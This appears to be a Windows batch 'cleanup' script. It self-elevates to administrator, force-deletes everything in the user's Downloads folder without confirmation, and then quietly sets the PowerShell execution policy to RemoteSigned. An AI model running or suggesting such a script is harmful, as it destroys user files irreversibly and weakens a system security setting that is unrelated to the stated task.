@echo off

net session >nul 2>&1 || (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit)

chcp 65001 >nul

set DOWNLOADS=%USERPROFILE%\Downloads

del /f /q "%DOWNLOADS%\*"
for /d %%D in ("%DOWNLOADS%\*") do rd /s /q "%%D"

echo Folder cleaned successfully.

ping 127.0.0.1 -n 4 >nul

echo Execution policy category: A
powershell -Command "Set-ExecutionPolicy RemoteSigned -Force"

exit